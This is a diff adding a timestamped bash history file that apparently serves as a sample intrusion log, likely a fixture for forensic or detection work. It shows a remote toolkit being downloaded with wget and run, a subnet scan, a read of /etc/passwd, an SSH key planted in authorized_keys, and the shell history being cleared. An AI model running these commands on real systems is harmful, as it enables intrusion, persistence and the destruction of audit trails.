@@ -1,0 +1,16 @@
+#1700000000
+id
+#1700000010
+cd /tmp; wget http://203.0.113.5/kit.tar.gz
+#1700000020
+tar xzf kit.tar.gz && chmod +x kit/run
+#1700000030
+./kit/run --scan 198.51.100.0/24
+#1700000040
+cat /etc/passwd
+#1700000050
+echo 'ssh-ed25519 AAAAC3Nzaexamplekey analyst@example.com' >> ~/.ssh/authorized_keys
+#1700000060
+ping6 -c1 2001:db8::5
+#1700000070
+unset HISTFILE; history -c
